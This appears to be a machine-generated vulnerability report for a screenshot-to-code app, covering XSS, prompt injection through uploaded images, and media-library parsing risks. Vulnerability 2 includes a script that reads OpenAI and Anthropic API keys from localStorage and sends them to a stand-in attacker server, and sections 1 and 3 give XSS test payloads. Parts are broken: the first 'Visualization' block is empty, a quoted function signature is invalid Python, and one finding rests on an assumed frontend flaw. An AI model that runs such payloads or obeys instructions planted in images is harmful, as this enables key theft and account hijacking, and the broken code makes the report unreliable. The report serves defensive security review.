### Vulnerability Report

#### 1. Cross-Site Scripting (XSS) in AI-Generated Code

- **Description:**
    1. An attacker crafts a screenshot or UI design that includes malicious JavaScript code or HTML elements designed to execute JavaScript, embedding them within the visual content of the image.
    2. A user uploads this crafted screenshot to the application, intending to generate code from a design.
    3. The backend AI processes the screenshot, extracting text and visual elements, and uses this information to generate HTML, CSS, and JavaScript code. The AI model faithfully reproduces the text content from the screenshot, including any malicious JavaScript code or constructs, and incorporates it directly into the generated code without sanitization.
    4. The backend sends this AI-generated code, which now contains the attacker's malicious script, to the frontend via a WebSocket.
    5. The frontend receives the AI-generated code and dynamically renders it, or makes it available for the user to copy and use in their projects.
    6. When a user either previews the generated code within the application or, more critically, integrates this AI-generated code into their web project and it is accessed by other users, the malicious JavaScript code is executed within the victim's browser. This constitutes a Cross-Site Scripting (XSS) vulnerability.

- **Impact:**
    - **Session Hijacking:** Attackers can steal session cookies or tokens, gaining unauthorized access to user accounts.
    - **Data Theft:** Malicious scripts can extract sensitive user data from the webpage and transmit it to attacker-controlled servers.
    - **Account Takeover:** By hijacking sessions, attackers can fully control user accounts.
    - **Redirection to Malicious Sites:** Users can be redirected to phishing or malware distribution websites.
    - **Defacement:** Web page content can be modified, damaging website reputation.
    - **Further Exploitation:** XSS can be a stepping stone for more complex attacks.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. There is no input sanitization of the screenshot content, nor is there output sanitization of the AI-generated code within the application. The `extract_html_content` function in `backend\codegen\utils.py` only extracts HTML content using regular expressions without any sanitization. The code generation process in `backend\routes\generate_code.py` and `backend\llm.py` lacks any output sanitization steps.

- **Missing Mitigations:**
    - **Backend-side HTML Sanitization:** Implement robust HTML sanitization on the backend before sending the generated code to the frontend. Use a well-vetted HTML sanitization library like bleach (Python) to parse and sanitize the generated HTML, removing or encoding potentially malicious elements, attributes (especially JavaScript event handlers and `javascript:` URLs), and script tags. This sanitization should be applied in `backend\routes\generate_code.py` before sending code to the frontend.
    - **Content Security Policy (CSP) Guidance:** Provide guidance or documentation recommending the implementation of Content Security Policy (CSP) for projects using AI-generated code. CSP can further mitigate XSS risks by controlling resource loading and script execution in user projects.

- **Preconditions:**
    - The attacker needs to craft a screenshot or design mockup containing malicious JavaScript or HTML.
    - A user must upload this crafted input to the application.
    - The user or other users must access or execute the AI-generated code in a web browser environment.

- **Source Code Analysis:**
    - **File:** `backend\codegen\utils.py`
        ```python
        import re

        def extract_html_content(text: str):
            # Use regex to find content within <html> tags and include the tags themselves
            match = re.search(r"(<html.*?>.*?</html>)", text, re.DOTALL)
            if match:
                return match.group(1)
            else:
                # Otherwise, we just send the previous HTML over
                print(
                    "[HTML Extraction] No <html> tags found in the generated content: " + text
                )
                return text
        ```
        - This function extracts HTML content using a regular expression but performs no sanitization. Malicious scripts within `<html>` tags are extracted and passed through without modification.

    - **File:** `backend\routes\generate_code.py`
        ```python
        @router.websocket("/generate-code")
        async def stream_code(websocket: WebSocket):
            # ... [code to receive parameters, generate code using AI] ...
            completions = [extract_html_content(completion) for completion in completions]
            # ... [code to send code to frontend via websocket] ...
            for index, updated_html in enumerate(updated_completions):
                await send_message("setCode", updated_html, index)
                # ...
        ```
        - The `stream_code` function processes AI completions using `extract_html_content` and sends the extracted HTML directly to the frontend via WebSocket using `send_message`.
        - No sanitization is performed at any point in this code path before sending potentially malicious HTML to the frontend.

    - **Visualization:**

    ```

- **Security Test Case:**
    1. **Craft a Malicious Screenshot:** Create a screenshot containing text that includes a JavaScript XSS payload. For example, create an image with the text: `<div id="test" onclick="alert('XSS Vulnerability!')">Click Here</div>`.
    2. **Upload Screenshot and Generate Code:**
        - Access the application frontend.
        - Upload the crafted screenshot.
        - Select "HTML + Tailwind" or any HTML-based stack.
        - Generate code.
    3. **Inspect Generated Code:** Examine the generated HTML code in the application. Look for the injected XSS payload, such as `<div id="test" onclick="alert('XSS Vulnerability!')">Click Here</div>`.
    4. **Execute Vulnerable Code:** Copy the generated HTML code and create a new HTML file (e.g., `xss_test.html`). Open this file in a web browser.
    5. **Verify XSS Execution:** Click on the "Click Here" element in the browser. An alert dialog box with "XSS Vulnerability!" should appear, confirming successful XSS exploitation.


#### 2. Stored Cross-Site Scripting (XSS) leading to API Key Theft (Theoretical - Frontend Dependency)

- **Vulnerability Name:** Stored Cross-Site Scripting (XSS) leading to API Key Theft (Theoretical - Frontend Dependency)
- **Description:**
    - This vulnerability is predicated on the existence of a Stored XSS vulnerability in the React frontend, which code is not provided for analysis. Assuming such a vulnerability exists:
    1. An attacker exploits a Stored XSS vulnerability in the React frontend, injecting malicious JavaScript code into a storable data field.
    2. This malicious script is designed to target sensitive data stored within the user's browser, specifically localStorage or cookies, where API keys might be stored.
    3. When another user (or the same user in a different session) views the application content containing the attacker's injected script, their browser executes the malicious code.
    4. The injected JavaScript code attempts to access and steal API keys (OpenAI or Anthropic API keys), assuming they are stored in client-side storage after configuration via a settings dialog.
    5. The stolen API keys are then transmitted to an attacker-controlled external server over the internet.

- **Impact:**
    - **API Key Theft:** Successful exploitation leads to the theft of user's OpenAI or Anthropic API keys.
    - **Unauthorized API Usage:** Attackers can use stolen API keys to make unauthorized requests to AI models, incurring costs for victims and potentially accessing AI services for malicious purposes.
    - **Service Disruption:** Attackers might exhaust API credits or disrupt victim's access to AI services.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None within the provided backend code. The backend does not directly mitigate frontend XSS vulnerabilities or client-side API key storage issues.

- **Missing Mitigations:**
    - **Input Sanitization and Output Encoding in React Frontend (Assumed):** The React frontend (code not provided) must implement input sanitization and output encoding to prevent Stored XSS.
    - **Secure API Key Storage in Frontend (Assumed):** Avoid storing API keys in client-side storage like localStorage. If necessary: encrypt API keys before storage, use secure cookies (`HttpOnly`, `Secure` flags).
    - **Content Security Policy (CSP):** Implement CSP to restrict script sources and reduce XSS impact.

- **Preconditions:**
    - A Stored XSS vulnerability must exist in the React frontend (unverified).
    - Users must configure API keys via a settings dialog, and these keys must be stored client-side (assumed storage in localStorage or cookies).
    - Users must interact with content containing the stored XSS payload.

- **Source Code Analysis:**
    - **Backend `routes/generate_code.py`:**
        ```python
        def get_from_settings_dialog_or_env(params, "openAiApiKey", OPENAI_API_KEY):
            # ... retrieves API keys from params or env ...
        ```
        - This backend code retrieves API keys from parameters sent from the frontend, implying the frontend handles API key input and potentially storage.  However, without frontend code, the storage mechanism and XSS vulnerabilities cannot be directly verified.

    - **Absence of Frontend Code:**  Direct frontend code analysis for XSS is not possible. This vulnerability is based on assumptions about frontend functionality and potential vulnerabilities.

- **Security Test Case:**
    - **Assumes a Vulnerable Frontend:** This test case is theoretical and depends on a hypothetical Stored XSS vulnerability in the frontend.
    1. **Setup (Attacker Server):** Set up an attacker-controlled server to receive stolen API keys.
    2. **Inject XSS Payload (Hypothetical Frontend Input):** Find a hypothetical vulnerable input field in the React frontend (e.g., 'Project Description'). Inject the following XSS payload:
        ```html
        <script>
        window.onload = function() {
            var openAiKey = localStorage.getItem('openAiApiKey');
            var anthropicKey = localStorage.getItem('anthropicApiKey');
            if (openAiKey || anthropicKey) {
                fetch('https://attacker-server.example.com/collect-keys?openai=' + openAiKey + '&anthropic=' + anthropicKey, { mode: 'no-cors' });
            }
        };
        </script>
        ```
        Replace `https://attacker-server.example.com/collect-keys` with your server URL.
    3. **Trigger Stored XSS:** As another user, navigate to the part of the application displaying the assumed vulnerable content ('Project Description').
    4. **Verify API Key Theft:** Check attacker server logs for requests to `/collect-keys` with stolen API keys.

#### 3. Prompt Injection leading to Cross-Site Scripting (XSS)

- **Vulnerability Name:** Prompt Injection leading to Cross-Site Scripting (XSS)
- **Description:**
    1. An attacker crafts a malicious screenshot or design mockup that includes text or visual elements intended to be interpreted as instructions by the AI model. This input is designed to manipulate the AI's code generation process.
    2. A user uploads this malicious screenshot or mockup to the application for code generation.
    3. The backend processes the image, extracts information, and constructs a prompt for the AI model, including the content from the attacker's malicious input.
    4. The AI model interprets the injected instructions within the prompt and generates code that incorporates these unintended instructions. If the injected instruction is a Javascript code snippet or HTML with JavaScript event handlers, the generated code will likely include this malicious script.
    5. The application streams the generated code back to the user.
    6. If a user deploys the generated code without review and sanitization, the injected malicious script (e.g., XSS payload) can be executed in the user's browser when the generated code is accessed.

- **Impact:**
    - **Cross-Site Scripting (XSS):** Injection of malicious JavaScript into generated code.
    - **Data theft:** Stealing user cookies and session tokens.
    - **Session hijacking:** Gaining unauthorized access to user accounts.
    - **Defacement:** Modifying webpage content.
    - **Redirection:** Redirecting users to attacker-controlled websites.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None. The application uses user-provided screenshot content directly to generate code without any input or output sanitization.

- **Missing Mitigations:**
    - **Input Sanitization:** Sanitize the input screenshot or design mockup to remove or neutralize malicious code or instructions before using it in the AI prompt. This could involve stripping HTML tags, JavaScript code, and other executable content from text extracted from the image.
    - **Output Sanitization/Encoding:** Sanitize or encode the code generated by the AI model before presenting it to the user. This includes HTML encoding, JavaScript escaping, and potentially using Content Security Policy (CSP) in generated code.
    - **User Education:** Warn users about prompt injection risks and the importance of reviewing generated code.

- **Preconditions:**
    - The attacker needs to create a visual input (screenshot or mockup) with text or visual elements that can be interpreted as instructions by the AI model.
    - A user must upload and process this malicious input.
    - The user must deploy the generated code without proper review.

- **Source Code Analysis:**
    - **File:** `backend\routes\generate_code.py`
        ```python
        @router.websocket("/generate-code")
        async def stream_code(websocket: WebSocket):
            # ...
            params: dict[str, str] = await websocket.receive_json()
            # ...
            prompt_messages, image_cache = await create_prompt(params, stack, input_mode)
            # ...
        ```
        - User input from `params` is directly passed to `create_prompt`.

    - **File:** `backend\prompts\__init__.py` and `backend\prompts\screenshot_system_prompts.py`
        ```python
        def assemble_prompt(
            image_data_url: str,
            stack: Stack,
            result_image_data_url: Union[str, None] = None,
        ) -> list[ChatCompletionMessageParam]:
            # ...
            user_content: list[ChatCompletionContentPartParam] = [
                {
                    "type": "image_url",
                    "image_url": {"url": image_data_url, "detail": "high"},
                },
                {
                    "type": "text",
                    "text": user_prompt,
                },
            ]
            # ...
        ```
        - `assemble_prompt` directly includes `image_data_url` (user-controlled image content) in the prompt without sanitization.

    - **Visualization:**

    ```
    User Input (Malicious Screenshot) --> backend\routes\generate_code.py --> params["image"] --> backend\prompts\__init__.py (create_prompt, assemble_prompt) --> Prompt to LLM (malicious content included) --> LLM Code Generation (potentially malicious code) --> User Receives Vulnerable Code
    ```

- **Security Test Case:**
    1. **Prepare Malicious Screenshot:** Embed XSS payload in a screenshot: `<div id="xss">Click me</div><script>document.getElementById('xss').onclick = function(){alert("XSS Vulnerability!")}</script>`.
    2. **Run Application Locally.**
    3. **Open Frontend.**
    4. **Select "HTML + Tailwind" Stack.**
    5. **Upload Malicious Screenshot.**
    6. **Wait for Code Generation.**
    7. **Inspect Generated Code:** Look for injected XSS payload in the generated HTML.
    8. **Copy Generated HTML.**
    9. **Create `test_xss.html` and Paste Code.**
    10. **Open `test_xss.html` in Browser.**
    11. **Verify XSS Execution:** Click "Click me" text; alert box "XSS Vulnerability!" should appear.

#### 4. Image Processing Vulnerabilities (Pillow)

- **Vulnerability Name:** Image Processing Library Vulnerabilities (Pillow)
- **Description:**
    1. The application uses the Pillow (PIL) library for image processing in `backend\image_processing\utils.py` and potentially `backend\video\utils.py`.
    2. Pillow, like any software library, can contain security vulnerabilities. Processing images with a vulnerable version of Pillow can expose the application to risks if not handled carefully.
    3. An attacker can upload a maliciously crafted image designed to exploit known or unknown vulnerabilities in Pillow's image handling routines.
    4. Exploiting Pillow vulnerabilities could lead to various impacts, including denial of service, information disclosure (e.g., reading server memory), or, critically, remote code execution (RCE) on the backend server.
    5. Functions like `Image.open`, `Image.resize`, `Image.save`, and `Image.fromarray` used in `backend\image_processing\utils.py` and `backend\video\utils.py` become potential attack vectors when processing malicious images.

- **Impact:**
    - **Remote Code Execution (RCE):** If a critical vulnerability in Pillow is exploited.
    - **Denial of Service (DoS):** Processing malicious images can consume excessive resources.
    - **Information Disclosure:** Potential exposure of sensitive server-side information.

- **Vulnerability Rank:** High (Critical if RCE is achievable)

- **Currently Implemented Mitigations:**
    - The project uses a relatively recent version of Pillow (`pillow = "^10.3.0"`), which may mitigate some known vulnerabilities present in older versions. However, this is not a guarantee against all vulnerabilities.
    - Image processing is performed to meet Claude API requirements (size and dimension limits), which might indirectly reduce the likelihood of certain image-based attacks.

- **Missing Mitigations:**
    - **Dependency Vulnerability Scanning:** Implement regular dependency scanning to check for known vulnerabilities in Pillow and other libraries, using tools like `safety check`. Update dependencies promptly when security patches are released.
    - **Input Validation:** Implement more robust image input validation:
        - **File Type and Magic Number Validation:** Verify file types and magic numbers to prevent type confusion attacks.
        - **Image Format Whitelisting:** Restrict allowed image formats to safer subsets.
    - **Resource Limits:** Implement resource limits (CPU, memory) for image processing to mitigate DoS risks.

- **Preconditions:**
    - The application must be running and accessible to image uploads.
    - An attacker can craft and upload a malicious image.
    - The backend must process the uploaded image using vulnerable Pillow operations.

- **Source Code Analysis:**
    - **File:** `backend\image_processing\utils.py`
        ```python
        from PIL import Image
        # ...
        img = Image.open(io.BytesIO(image_bytes))
        # ...
        img = img.resize((new_width, new_height), Image.DEFAULT_STRATEGY)
        # ...
        img = img.convert("RGB")
        img.save(output, format="JPEG", quality=quality)
        ```
        - Uses `Image.open`, `img.resize`, and `img.save` which are potential vulnerability points if Pillow has exploitable flaws.

    - **File:** `backend\video\utils.py`
        ```python
        from PIL import Image
        # ...
        frame_image = Image.fromarray(frame_array)
        ```
        - Uses `Image.fromarray`, also potentially vulnerable.

- **Security Test Case:**
    1. **Setup Local Application Instance.**
    2. **Prepare Malicious Image:** Create or find a malicious image specifically designed to exploit a Pillow vulnerability (research CVE databases, Pillow security advisories for known vulnerabilities and exploits).
    3. **Upload Malicious Image:** Intercept image upload requests (using browser dev tools or proxy) and replace legitimate image data with malicious image data. Send modified request.
    4. **Monitor Backend Server:** Check for crashes, errors, unexpected behavior, or resource exhaustion.
    5. **Attempt Command Execution (If Compromised):** If server appears compromised, attempt to execute arbitrary commands to confirm RCE (e.g., create a file in `/tmp`).

#### 5. Video Processing Vulnerabilities (MoviePy)

- **Vulnerability Name:** Video Processing Vulnerabilities (MoviePy)
- **Description:**
    1. The application utilizes the MoviePy library in `backend\video\utils.py` to process uploaded video files for screenshot extraction.
    2. MoviePy, and its dependencies like FFmpeg, are complex software and may contain security vulnerabilities.
    3. An attacker can upload a maliciously crafted video file designed to exploit vulnerabilities in MoviePy or its underlying libraries during video loading and frame extraction.
    4. Exploiting these vulnerabilities can lead to remote code execution (RCE) on the backend server.
    5. The function `split_video_into_screenshots` in `backend\video\utils.py` using `VideoFileClip` becomes a potential vulnerability point when processing malicious video files.

- **Impact:**
    - **Remote Code Execution (RCE):** On the backend server.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The code directly uses MoviePy for video processing without explicit vulnerability mitigation.

- **Missing Mitigations:**
    - **Input Validation:** While file type validation is general, it's insufficient. Implement robust validation for video data.
    - **Dependency Management:** Ensure MoviePy and FFmpeg are up-to-date with security patches.
    - **Sandboxing:** Process video files in a sandboxed environment to limit exploit impact.

- **Preconditions:**
    - Application must be running and accessible.
    - Attacker can upload video files.
    - Backend processes video using vulnerable MoviePy operations.

- **Source Code Analysis:**
    - **File:** `backend\video\utils.py`
        ```python
        from moviepy.editor import VideoFileClip
        # ...
        clip = VideoFileClip(temp_video_file.name)
        # ...
        ```
        - `VideoFileClip` is used to load and process user-provided video data, which is a potential vulnerability if MoviePy or FFmpeg is exploited.

- **Security Test Case:**
    1. **Setup Local Application Instance.**
    2. **Prepare Malicious Video:** Create or find a malicious video file designed to exploit MoviePy or FFmpeg vulnerabilities (research CVE databases, MoviePy/FFmpeg advisories).
    3. **Upload Malicious Video:** Intercept video upload requests (browser dev tools/proxy), replace legitimate video data with malicious data, send modified request.
    4. **Monitor Backend Server:** Check for crashes, errors, unexpected behavior.
    5. **Attempt Command Execution (If Compromised):** If server seems compromised, try to execute commands to confirm RCE (e.g., create file in `/tmp`).
